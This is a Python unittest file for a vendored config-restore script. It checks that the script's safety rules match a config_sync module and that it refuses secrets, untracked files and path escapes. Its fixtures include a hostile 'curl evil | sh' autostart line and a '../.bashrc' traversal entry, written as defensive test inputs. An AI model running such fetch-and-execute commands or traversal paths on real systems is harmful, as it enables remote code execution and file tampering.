"""Drift guard + behaviour tests for the stdlib-only vendored restore script
(Substrate core/architecture/fleet-config-deploy.py), which duplicates config_sync's rules
on purpose (it must run on a bare netinst box). Skipped if Substrate isn't mounted.
Run as a NON-root user."""

import hashlib
import importlib.util
import json
import os
import tempfile
import unittest
from pathlib import Path

from armamentarium import config_sync as cs

SCRIPT = Path("~/Datasets/Substrate/core/architecture/fleet-config-deploy.py").expanduser()
HOST = "freshbox"


def load():
    spec = importlib.util.spec_from_file_location("fleet_config_deploy", SCRIPT)
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


class Answers:
    def __init__(self, *a):
        self.a = list(a)

    def __call__(self, q):
        return self.a.pop(0) if self.a else ""


@unittest.skipUnless(SCRIPT.is_file(), "Substrate not mounted")
class TestVendoredRulesMatch(unittest.TestCase):
    def test_constants_identical(self):
        v = load()
        for name in ("POLICY_FILES", "NEVER_SYNC", "CODE_RUNNER_EXACT", "CODE_RUNNER_PREFIXES",
                     "SECRET_PREFIXES", "SECRET_ALLOW_EXACT", "SECRET_NAME_PARTS",
                     "SECRET_SUFFIXES", "LOCAL_TRACKED_REL"):
            self.assertEqual(getattr(v, name), getattr(cs, name), name)


@unittest.skipUnless(SCRIPT.is_file(), "Substrate not mounted")
class TestVendoredBehaviour(unittest.TestCase):
    def setUp(self):
        self.v = load()
        self.tmp = tempfile.TemporaryDirectory()
        t = Path(os.path.realpath(self.tmp.name))
        self.root, self.home = t / "store", t / "home"
        self.cfg = self.home / ".config"
        self.cfg.mkdir(parents=True)
        self.hdir = self.root / "config" / HOST
        self.mirror = self.hdir / "config"
        self.mirror.mkdir(parents=True)
        self.files = {}

    def tearDown(self):
        self.tmp.cleanup()

    def store(self, rel, data, tracked=True):
        p = self.mirror / rel
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_bytes(data)
        self.files[rel] = {"sha256": hashlib.sha256(data).hexdigest()}
        (self.hdir / "manifest.json").write_text(json.dumps({"files": self.files}))
        lines = [r for r in self.files if tracked or r != rel]
        prev = (self.hdir / "tracked.txt").read_text().split() if (
            self.hdir / "tracked.txt").exists() else []
        keep = [r for r in prev if r in self.files] + [r for r in lines if r not in prev]
        if not tracked:
            keep = [r for r in keep if r != rel]
        (self.hdir / "tracked.txt").write_text("\n".join(keep) + "\n")

    def plan(self):
        return self.v.build_plan(HOST, self.root, self.home)

    def apply(self, plan, *answers, tty=True):
        return self.v.apply(plan, self.home, prompt=Answers(*answers), out=lambda s: None,
                            isatty=lambda: tty)

    def act(self, plan, rel):
        return next(e for e in plan["entries"] if e["path"] == rel)["action"]

    def test_no_terminal_writes_nothing(self):
        self.store("foo/app.conf", b"a=1\n")
        r = self.apply(self.plan(), "y", tty=False)
        self.assertIsNotNone(r["error"])
        self.assertFalse((self.cfg / "foo/app.conf").exists())

    def test_code_runner_needs_name_and_policy_never_written(self):
        self.store("labwc/autostart", b"curl evil | sh &\n")
        self.store("armamentarium/exec.json", b'{"rules": {}}\n')
        self.store("foo/app.conf", b"a=1\n")
        plan = self.plan()
        self.assertEqual(self.act(plan, "armamentarium/exec.json"), "policy")
        r = self.apply(plan, "y", "nope", "n")
        self.assertEqual(r["applied"], ["foo/app.conf"])
        self.assertEqual(r["skipped_by_operator"], ["labwc/autostart"])
        self.assertFalse((self.cfg / "labwc/autostart").exists())
        self.assertFalse((self.cfg / "armamentarium/exec.json").exists())

    def test_escapes_secrets_untracked_refused(self):
        self.store("gh/hosts.yml", b"token: x\n")
        self.store("foo/sneaky.conf", b"x\n", tracked=False)
        self.files["../.bashrc"] = {"sha256": "0" * 64}
        (self.hdir / "manifest.json").write_text(json.dumps({"files": self.files}))
        (self.hdir / ".bashrc").write_bytes(b"evil\n")
        with open(self.hdir / "tracked.txt", "a") as f:
            f.write("../.bashrc\n")
        plan = self.plan()
        for rel in ("gh/hosts.yml", "foo/sneaky.conf", "../.bashrc"):
            self.assertEqual(self.act(plan, rel), "refused", rel)
        self.apply(plan, "y", "n")
        self.assertFalse((self.home / ".bashrc").exists())

    def test_seeds_local_tracked_list_only_when_confirmed(self):
        self.store("foo/app.conf", b"a=1\n")
        self.store("gh/hosts.yml", b"token: x\n")
        r = self.apply(self.plan(), "y", "y")
        self.assertTrue(r["seeded_tracked"])
        local = (self.home / cs.LOCAL_TRACKED_REL).read_text()
        self.assertIn("foo/app.conf", local)
        self.assertNotIn("gh/hosts.yml", local)
        self.assertEqual((self.home / cs.LOCAL_TRACKED_REL).stat().st_mode & 0o777, 0o644)

    def test_no_manifest_is_not_an_error(self):
        self.assertIsNotNone(self.v.build_plan("nobody", self.root, self.home)["error"])
        self.assertEqual(self.v.main(["nobody"]), 0)


if __name__ == "__main__":
    unittest.main()
